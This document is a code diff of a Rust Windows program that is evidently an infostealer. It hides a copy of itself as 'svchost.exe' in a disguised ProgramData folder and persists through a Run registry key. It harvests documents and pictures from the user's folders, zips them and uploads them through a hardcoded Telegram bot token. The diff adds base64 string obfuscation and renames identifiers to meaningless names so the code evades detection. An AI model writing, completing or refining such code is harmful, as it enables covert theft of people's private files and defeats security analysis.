@@ -1,6 +1,8 @@
 #![windows_subsystem = "windows"]
 
-use std::fs::{self, File};
+mod obfuscation;
+
+use std::fs::{self};
 use std::io::{Read, Write};
 use std::path::{Path, PathBuf};
 use zip::ZipWriter;
@@ -9,10 +11,13 @@ use dirs::{desktop_dir, document_dir, picture_dir, download_dir};
 use tokio;
 use rand::Rng;
 use tokio::time::{sleep, Duration};
-use winreg::enums::*;
-use winreg::RegKey;
 use std::process::Command;
 use std::env;
+
+#[cfg(windows)]
+use winreg::enums::*;
+#[cfg(windows)]
+use winreg::RegKey;
 
 const MAX_SIZE_PDF: u64 = 10 * 1024 * 1024;
 const MAX_SIZE_DOC: u64 = 10 * 1024 * 1024;
@@ -30,90 +35,79 @@ struct FileInfo {
 mod utils {
     use super::*;
 
-    pub async fn random_delay() {
-        let delay = rand::thread_rng().gen_range(1000..5000);
-        sleep(Duration::from_millis(delay)).await;
+    pub async fn a2d5h7k1() {
+        let v_a1b2 = rand::thread_rng().gen_range(1000..5000);
+        sleep(Duration::from_millis(v_a1b2)).await;
     }
 }
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let current_exe = env::current_exe()?;
+    let v_c3d4 = env::current_exe()?;
     
-    let programdata_path = env::var("PROGRAMDATA")
-        .unwrap_or_else(|_| "C:\\ProgramData".to_string());
-    let hidden_folder_path = Path::new(&programdata_path).join("WindowsUpdateService");
-    let target_exe = hidden_folder_path.join("svchost.exe");
+    let v_e5f6 = env::var(&obfuscation::deobfuscate("UFJPR1JBTURBVEE=").unwrap_or_default())
+        .unwrap_or_else(|_| obfuscation::deobfuscate("QzpcUHJvZ3JhbURhdGE=").unwrap_or_default());
+    let v_g7h8 = Path::new(&v_e5f6).join(obfuscation::deobfuscate("V2luZG93c1VwZGF0ZVNlcnZpY2U=").unwrap_or_default());
+    let v_i9j0 = v_g7h8.join(obfuscation::deobfuscate("c3ZjaG9zdC5leGU=").unwrap_or_default());
     
-    if current_exe == target_exe {
-        println!("ProgramData'dan çalışıyorum, doğrudan işleme başlıyorum...");
-        return xyz123().await;
+    if v_c3d4 == v_i9j0 {
+        return b4g8l2p6().await;
     }
     
-    let already_installed = abc456(&target_exe);
+    let v_k1l2 = c5i9m3q7(&v_i9j0)?;
     
-    if !already_installed {
-        if let Err(e) = def789(&target_exe) {
-            eprintln!("ProgramData'ya kopyalama hatası: {}", e);
+    if !v_k1l2 {
+        if let Err(_) = d6j0n4r8(&v_i9j0) {
         }
         
-        if let Err(e) = ghi012(&target_exe) {
-            eprintln!("Registry'ye ekleme hatası: {}", e);
+        if let Err(_) = e7k1o5s9(&v_i9j0) {
         }
-    } else {
-        println!("Zaten kurulu, tekrar kurmaya gerek yok...");
     }
     
-    jkl345(&target_exe)?;
+    f8l2p6t0(&v_i9j0)?;
     
     Ok(())
 }
 
-async fn xyz123() -> Result<(), Box<dyn std::error::Error>> {
-    let all_files = mno678()?;
+async fn b4g8l2p6() -> Result<(), Box<dyn std::error::Error>> {
+    let v_m3n4 = k3q7u1y5()?;
 
-    if all_files.is_empty() {
-        println!("Dosya bulunamadı.");
+    if v_m3n4.is_empty() {
         return Ok(());
     }
 
-    println!("Toplam {} dosya bulundu.", all_files.len());
+    let v_o5p6 = m5s9w3a7(&v_m3n4)?;
 
-    let zip_chunks = pqr901(&all_files)?;
+    for (i, v_q7r8) in v_o5p6.iter().enumerate() {
+        let v_s9t0 = format!("{}_{}.zip", &obfuscation::deobfuscate("Y29sbGVjdGVkX2ZpbGVzX3BhcnQ=").unwrap_or_default(), i + 1);
 
-    println!("{} adet zip dosyası oluşturuldu.", zip_chunks.len());
-
-    for (i, zip_data) in zip_chunks.iter().enumerate() {
-        let file_name = format!("collected_files_part_{}.zip", i + 1);
-        println!("{}. zip dosyası gönderiliyor...", i + 1);
-
-        utils::random_delay().await;
-        match stu234(zip_data, &file_name).await {
-            Ok(_) => println!("{}. zip dosyası başarıyla gönderildi.", i + 1),
-            Err(e) => println!("{}. zip dosyası gönderilirken hata: {}", i + 1, e),
+        utils::a2d5h7k1().await;
+        match n6t0x4b8(v_q7r8, &v_s9t0).await {
+            Ok(_) => {},
+            Err(_) => {},
         }
     }
 
-    println!("İşlem tamamlandı.");
     Ok(())
 }
 
-fn abc456(target_exe: &Path) -> bool {
-    let programdata_exists = target_exe.exists();
+#[cfg(windows)]
+fn c5i9m3q7(v_i9j0: &Path) -> Result<bool, Box<dyn std::error::Error>> {
+    let v_u1v2 = v_i9j0.exists();
     
-    let mut registry_exists = false;
+    let mut v_w3x4 = false;
     
-    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
-    match hkcu.open_subkey_with_flags(
-        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
+    let v_y5z6 = RegKey::predef(HKEY_CURRENT_USER);
+    match v_y5z6.open_subkey_with_flags(
+        &obfuscation::deobfuscate("U09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93c1xcQ3VycmVudFZlcnNpb25cXFJ1bg==")?,
         KEY_READ
     ) {
-        Ok(run_key) => {
-            match run_key.get_value::<String, _>("WindowsUpdateService") {
-                Ok(existing_value) => {
-                    let expected_path = target_exe.to_string_lossy();
-                    if existing_value == expected_path {
-                        registry_exists = true;
+        Ok(v_a1b2) => {
+            match v_a1b2.get_value::<String, _>(&obfuscation::deobfuscate("V2luZG93c1VwZGF0ZVNlcnZpY2U=")?) {
+                Ok(v_c3d4) => {
+                    let v_e5f6 = v_i9j0.to_string_lossy();
+                    if v_c3d4 == v_e5f6 {
+                        v_w3x4 = true;
                     }
                 },
                 Err(_) => {}
@@ -122,64 +116,67 @@ fn abc456(target_exe: &Path) -> bool {
         Err(_) => {}
     }
     
-    programdata_exists && registry_exists
+    Ok(v_u1v2 && v_w3x4)
 }
 
-fn def789(target_exe: &Path) -> Result<(), Box<dyn std::error::Error>> {
-    println!("ProgramData'ya kopyalanıyor...");
-    
-    let hidden_folder_path = target_exe.parent().unwrap();
+#[cfg(not(windows))]
+fn c5i9m3q7(_v_i9j0: &Path) -> Result<bool, Box<dyn std::error::Error>> {
+    Ok(false)
+}
 
-    if !hidden_folder_path.exists() {
-        fs::create_dir_all(&hidden_folder_path)?;
-        Command::new("attrib")
-            .args(&["+h", &hidden_folder_path.to_string_lossy()])
+fn d6j0n4r8(v_i9j0: &Path) -> Result<(), Box<dyn std::error::Error>> {
+    let v_g7h8 = v_i9j0.parent().unwrap();
+
+    if !v_g7h8.exists() {
+        fs::create_dir_all(&v_g7h8)?;
+        let hidden_folder_path_str = v_g7h8.to_string_lossy().to_string();
+        Command::new(&obfuscation::deobfuscate("YXR0cmli")?)
+            .args([&obfuscation::deobfuscate("K2g=")?, &hidden_folder_path_str])
             .output()?;
     }
-    let current_exe = env::current_exe()?;
-    fs::copy(&current_exe, target_exe)?;
-    Command::new("attrib")
-        .args(&["+h", &target_exe.to_string_lossy()])
+    let v_k1l2 = env::current_exe()?;
+    fs::copy(&v_k1l2, v_i9j0)?;
+    let target_exe_str = v_i9j0.to_string_lossy().to_string();
+    Command::new(&obfuscation::deobfuscate("YXR0cmli")?)
+        .args([&obfuscation::deobfuscate("K2g=")?, &target_exe_str])
         .output()?;
     
-    println!(".");
     Ok(())
 }
 
-fn ghi012(target_exe: &Path) -> Result<(), Box<dyn std::error::Error>> {
-    println!("Registry'ye ekleniyor...");
-    
-    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
-    let run_key = hkcu.open_subkey_with_flags(
-        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
+#[cfg(windows)]
+fn e7k1o5s9(v_i9j0: &Path) -> Result<(), Box<dyn std::error::Error>> {
+    let v_m3n4 = RegKey::predef(HKEY_CURRENT_USER);
+    let v_o5p6 = v_m3n4.open_subkey_with_flags(
+        &obfuscation::deobfuscate("U09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93c1xcQ3VycmVudFZlcnNpb25cXFJ1bg==")?,
         KEY_WRITE
     )?;
     
-    let value_name = "WindowsUpdateService";
-    let exe_path = target_exe.to_string_lossy();
+    let v_q7r8 = &obfuscation::deobfuscate("V2luZG93c1VwZGF0ZVNlcnZpY2U=")?;
+    let v_s9t0 = v_i9j0.to_string_lossy();
     
-    run_key.set_value(value_name, &exe_path.to_string())?;
+    v_o5p6.set_value(v_q7r8, &v_s9t0.to_string())?;
     
-    println!("Registry'ye başarıyla eklendi.");
     Ok(())
 }
 
-fn jkl345(target_exe: &Path) -> Result<(), Box<dyn std::error::Error>> {
-    println!("ProgramData'daki kopya çalıştırılıyor...");
-    
-    if target_exe.exists() {
-        Command::new(target_exe)
+#[cfg(not(windows))]
+fn e7k1o5s9(_v_i9j0: &Path) -> Result<(), Box<dyn std::error::Error>> {
+    Ok(())
+}
+
+fn f8l2p6t0(v_i9j0: &Path) -> Result<(), Box<dyn std::error::Error>> {
+    if v_i9j0.exists() {
+        Command::new(v_i9j0)
             .spawn()
             .ok();
-    } else {
-        println!("Hedef dosya bulunamadı!");
     }
     
     std::process::exit(0);
 }
 
-fn get_max_size_for_extension(extension: &str) -> u64 {
-    match extension.to_lowercase().as_str() {
+fn g9m3q7u1(v_a1b2: &str) -> u64 {
+    match v_a1b2.to_lowercase().as_str() {
         "pdf" => MAX_SIZE_PDF,
         "doc" => MAX_SIZE_DOC,
         "docx" => MAX_SIZE_DOCX,
@@ -189,26 +186,26 @@ fn get_max_size_for_extension(extension: &str) -> u64 {
     }
 }
 
-fn is_target_file(path: &Path) -> bool {
-    if let Some(extension) = path.extension() {
-        let ext = extension.to_string_lossy().to_lowercase();
-        matches!(ext.as_str(), "pdf" | "doc" | "docx" | "png" | "jpeg" | "jpg" | "txt")
+fn h0n4r8v2(v_c3d4: &Path) -> bool {
+    if let Some(v_e5f6) = v_c3d4.extension() {
+        let v_g7h8 = v_e5f6.to_string_lossy().to_lowercase();
+        matches!(v_g7h8.as_str(), "pdf" | "doc" | "docx" | "png" | "jpeg" | "jpg" | "txt")
     } else {
         false
     }
 }
 
-fn is_file_size_ok(path: &Path) -> bool {
-    if let Some(extension) = path.extension() {
-        let ext = extension.to_string_lossy().to_lowercase();
-        let max_size = get_max_size_for_extension(&ext);
+fn i1o5s9w3(v_i9j0: &Path) -> bool {
+    if let Some(v_k1l2) = v_i9j0.extension() {
+        let v_m3n4 = v_k1l2.to_string_lossy().to_lowercase();
+        let v_o5p6 = g9m3q7u1(&v_m3n4);
 
-        if max_size == 0 {
+        if v_o5p6 == 0 {
             return false;
         }
 
-        match fs::metadata(path) {
-            Ok(metadata) => metadata.len() <= max_size,
+        match fs::metadata(v_i9j0) {
+            Ok(v_q7r8) => v_q7r8.len() <= v_o5p6,
             Err(_) => false,
         }
     } else {
@@ -216,53 +213,53 @@ fn is_file_size_ok(path: &Path) -> bool {
     }
 }
 
-fn vwx567(folder_path: &Path, base_folder: &str) -> Result<Vec<FileInfo>, Box<dyn std::error::Error>> {
-    let mut files = Vec::new();
+fn j2p6t0x4(v_s9t0: &Path, v_u1v2: &str) -> Result<Vec<FileInfo>, Box<dyn std::error::Error>> {
+    let mut v_w3x4 = Vec::new();
 
-    if !folder_path.exists() {
-        return Ok(files);
+    if !v_s9t0.exists() {
+        return Ok(v_w3x4);
     }
 
-    fn walk_dir(
-        dir: &Path,
-        base_folder: &str,
-        current_path: &str,
-        files: &mut Vec<FileInfo>
+    fn v_y5z6(
+        v_a1b2: &Path,
+        v_c3d4: &str,
+        v_e5f6: &str,
+        v_g7h8: &mut Vec<FileInfo>
     ) -> Result<(), Box<dyn std::error::Error>> {
-        let entries = match fs::read_dir(dir) {
-            Ok(entries) => entries,
+        let v_i9j0 = match fs::read_dir(v_a1b2) {
+            Ok(v_i9j0) => v_i9j0,
             Err(_) => return Ok(()),
         };
 
-        for entry in entries {
-            let entry = match entry {
-                Ok(entry) => entry,
+        for v_k1l2 in v_i9j0 {
+            let v_k1l2 = match v_k1l2 {
+                Ok(v_k1l2) => v_k1l2,
                 Err(_) => continue,
             };
 
-            let path = entry.path();
+            let v_m3n4 = v_k1l2.path();
 
-            if path.is_file() {
-                if is_target_file(&path) && is_file_size_ok(&path) {
-                    let relative_path = if current_path.is_empty() {
-                        format!("{}/{}", base_folder, path.file_name().unwrap().to_string_lossy())
+            if v_m3n4.is_file() {
+                if h0n4r8v2(&v_m3n4) && i1o5s9w3(&v_m3n4) {
+                    let v_o5p6 = if v_e5f6.is_empty() {
+                        format!("{}/{}", v_c3d4, v_m3n4.file_name().unwrap().to_string_lossy())
                     } else {
-                        format!("{}/{}/{}", base_folder, current_path, path.file_name().unwrap().to_string_lossy())
+                        format!("{}/{}/{}", v_c3d4, v_e5f6, v_m3n4.file_name().unwrap().to_string_lossy())
                     };
-                    files.push(FileInfo { path, relative_path });
+                    v_g7h8.push(FileInfo { path: v_m3n4, relative_path: v_o5p6 });
                 }
-            } else if path.is_dir() {
-                let dir_name = match path.file_name() {
+            } else if v_m3n4.is_dir() {
+                let v_q7r8 = match v_m3n4.file_name() {
                     Some(name) => name.to_string_lossy(),
                     None => continue,
                 };
 
-                let new_current_path = if current_path.is_empty() {
-                    dir_name.to_string()
+                let v_s9t0 = if v_e5f6.is_empty() {
+                    v_q7r8.to_string()
                 } else {
-                    format!("{}/{}", current_path, dir_name)
+                    format!("{}/{}", v_e5f6, v_q7r8)
                 };
-                if walk_dir(&path, base_folder, &new_current_path, files).is_err() {
+                if v_y5z6(&v_m3n4, v_c3d4, &v_s9t0, v_g7h8).is_err() {
                     continue;
                 }
             }
@@ -270,128 +267,132 @@ fn vwx567(folder_path: &Path, base_folder: &str) -> Result<Vec<FileInfo>, Box<dy
         Ok(())
     }
 
-    walk_dir(folder_path, base_folder, "", &mut files)?;
-    Ok(files)
+    v_y5z6(v_s9t0, v_u1v2, "", &mut v_w3x4)?;
+    Ok(v_w3x4)
 }
 
-fn mno678() -> Result<Vec<FileInfo>, Box<dyn std::error::Error>> {
-    let mut all_files = Vec::new();
+fn k3q7u1y5() -> Result<Vec<FileInfo>, Box<dyn std::error::Error>> {
+    let mut v_a1b2 = Vec::new();
 
-    if let Some(desktop_path) = desktop_dir() {
-        if let Ok(mut desktop_files) = vwx567(&desktop_path, "Desktop") {
-            all_files.append(&mut desktop_files);
+    if let Some(v_c3d4) = desktop_dir() {
+        if let Ok(mut v_e5f6) = j2p6t0x4(&v_c3d4, &obfuscation::deobfuscate("RGVza3RvcA==").unwrap_or_default()) {
+            v_a1b2.append(&mut v_e5f6);
         }
     }
 
-    if let Some(download_path) = download_dir() {
-        if let Ok(mut download_files) = vwx567(&download_path, "Downloads") {
-            all_files.append(&mut download_files);
+    if let Some(v_g7h8) = download_dir() {
+        if let Ok(mut v_i9j0) = j2p6t0x4(&v_g7h8, &obfuscation::deobfuscate("RG93bmxvYWRz").unwrap_or_default()) {
+            v_a1b2.append(&mut v_i9j0);
         }
     }
 
-    if let Some(document_path) = document_dir() {
-        if let Ok(mut document_files) = vwx567(&document_path, "Documents") {
-            all_files.append(&mut document_files);
+    if let Some(v_k1l2) = document_dir() {
+        if let Ok(mut v_m3n4) = j2p6t0x4(&v_k1l2, &obfuscation::deobfuscate("RG9jdW1lbnRz").unwrap_or_default()) {
+            v_a1b2.append(&mut v_m3n4);
         }
     }
 
-    if let Some(picture_path) = picture_dir() {
-        if let Ok(mut picture_files) = vwx567(&picture_path, "Pictures") {
-            all_files.append(&mut picture_files);
+    if let Some(v_o5p6) = picture_dir() {
+        if let Ok(mut v_q7r8) = j2p6t0x4(&v_o5p6, &obfuscation::deobfuscate("UGljdHVyZXM=").unwrap_or_default()) {
+            v_a1b2.append(&mut v_q7r8);
         }
     }
 
-    Ok(all_files)
+    Ok(v_a1b2)
 }
 
-fn yza890(files: &[FileInfo]) -> Result<Vec<Vec<FileInfo>>, Box<dyn std::error::Error>> {
-    let mut chunks = Vec::new();
-    let mut current_chunk = Vec::new();
-    let mut current_size = 0;
+fn l4r8v2z6(v_s9t0: &[FileInfo]) -> Result<Vec<Vec<FileInfo>>, Box<dyn std::error::Error>> {
+    let mut v_u1v2 = Vec::new();
+    let mut v_w3x4 = Vec::new();
+    let mut v_y5z6 = 0;
 
-    for file in files {
-        let file_size = match fs::metadata(&file.path) {
-            Ok(metadata) => metadata.len(),
+    for v_a1b2 in v_s9t0 {
+        let v_c3d4 = match fs::metadata(&v_a1b2.path) {
+            Ok(v_c3d4) => v_c3d4.len(),
             Err(_) => continue,
         };
 
-        if file_size > MAX_ZIP_SIZE {
+        if v_c3d4 > MAX_ZIP_SIZE {
             continue;
         }
 
-        if current_size + file_size > MAX_ZIP_SIZE && !current_chunk.is_empty() {
-            chunks.push(current_chunk);
-            current_chunk = Vec::new();
-            current_size = 0;
+        if v_y5z6 + v_c3d4 > MAX_ZIP_SIZE && !v_w3x4.is_empty() {
+            v_u1v2.push(v_w3x4);
+            v_w3x4 = Vec::new();
+            v_y5z6 = 0;
         }
 
-        current_chunk.push(file.clone());
-        current_size += file_size;
+        v_w3x4.push(v_a1b2.clone());
+        v_y5z6 += v_c3d4;
     }
 
-    if !current_chunk.is_empty() {
-        chunks.push(current_chunk);
+    if !v_w3x4.is_empty() {
+        v_u1v2.push(v_w3x4);
     }
 
-    Ok(chunks)
+    Ok(v_u1v2)
 }
 
-fn pqr901(files: &[FileInfo]) -> Result<Vec<Vec<u8>>, Box<dyn std::error::Error>> {
-    let file_chunks = yza890(files)?;
-    let mut all_zips = Vec::new();
+fn m5s9w3a7(v_e5f6: &[FileInfo]) -> Result<Vec<Vec<u8>>, Box<dyn std::error::Error>> {
+    let v_g7h8 = l4r8v2z6(v_e5f6)?;
+    let mut v_i9j0 = Vec::new();
 
-    for chunk in file_chunks.iter() {
-        let mut zip_buffer = Vec::new();
+    for v_k1l2 in v_g7h8.iter() {
+        let mut v_m3n4 = Vec::new();
         {
-            let mut zip_writer = ZipWriter::new(std::io::Cursor::new(&mut zip_buffer));
+            let mut v_o5p6 = ZipWriter::new(std::io::Cursor::new(&mut v_m3n4));
 
-            let options = FileOptions::default()
+            let v_q7r8 = FileOptions::default()
                 .compression_method(zip::CompressionMethod::Stored);
 
-            for file_info in chunk {
-                if zip_writer.start_file(file_info.relative_path.clone(), options).is_ok() {
-                    if let Ok(mut file) = File::open(&file_info.path) {
-                        let mut file_content = Vec::new();
-                        if file.read_to_end(&mut file_content).is_ok() {
-                            let _ = zip_writer.write_all(&file_content);
+            for v_s9t0 in v_k1l2 {
+                if v_o5p6.start_file(v_s9t0.relative_path.clone(), v_q7r8).is_ok() {
+                    if let Ok(mut v_u1v2) = std::fs::File::open(&v_s9t0.path) {
+                        let mut v_w3x4 = Vec::new();
+                        if v_u1v2.read_to_end(&mut v_w3x4).is_ok() {
+                            let _ = v_o5p6.write_all(&v_w3x4);
                         }
                     }
                 }
             }
 
-            zip_writer.finish()?;
+            v_o5p6.finish()?;
         }
 
-        all_zips.push(zip_buffer);
+        v_i9j0.push(v_m3n4);
     }
 
-    Ok(all_zips)
+    Ok(v_i9j0)
 }
 
-async fn stu234(zip_data: &[u8], file_name: &str) -> Result<(), Box<dyn std::error::Error>> {
-    let bot_token = "7960837487:AAFKrBL143XIALZB39n9fQ9bXXT4ldrRlns";
-    let chat_id = "7279467950";
+async fn n6t0x4b8(v_y5z6: &[u8], v_a1b2: &str) -> Result<(), Box<dyn std::error::Error>> {
+    let v_c3d4 = obfuscation::deobfuscate("Nzk2MDgzNzQ4NzpBQUZLckJMMTQzWElBTFpCMzluOWZROWJYWFQ0bGRyUmxucw==")?;
+    let v_e5f6 = obfuscation::deobfuscate("NzI3OTQ2Nzk1MA==")?;
 
-    let url = format!("https://api.telegram.org/bot{}/sendDocument", bot_token);
+    let v_g7h8 = format!("https://api.telegram.org/bot{}/{}", v_c3d4, obfuscation::deobfuscate("c2VuZERvY3VtZW50")?);
 
-    let client = reqwest::Client::new();
+    let v_i9j0 = reqwest::Client::new();
 
-    let form = reqwest::multipart::Form::new()
-        .text("chat_id", chat_id.to_string())
-        .part("document",
-            reqwest::multipart::Part::bytes(zip_data.to_vec())
-                .file_name(file_name.to_string())
-                .mime_str("application/zip")?
+    let chat_id_str = obfuscation::deobfuscate("Y2hhdF9pZA==")?;
+    let document_str = obfuscation::deobfuscate("ZG9jdW1lbnQ=")?;
+    let mime_str = &obfuscation::deobfuscate("YXBwbGljYXRpb24vemlw")?;
+
+    let v_k1l2 = reqwest::multipart::Form::new()
+        .text(chat_id_str, v_e5f6)
+        .part(document_str,
+            reqwest::multipart::Part::bytes(v_y5z6.to_vec())
+                .file_name(v_a1b2.to_string())
+                .mime_str(mime_str)?
         );
 
-    let response = client.post(&url)
-        .multipart(form)
+    let v_m3n4 = v_i9j0.post(&v_g7h8)
+        .multipart(v_k1l2)
         .send()
         .await?;
 
-    if !response.status().is_success() {
-        let error_text = response.text().await?;
-        return Err(error_text.into());
+    if !v_m3n4.status().is_success() {
+        let v_o5p6 = v_m3n4.text().await?;
+        return Err(v_o5p6.into());
     }
 
     Ok(())
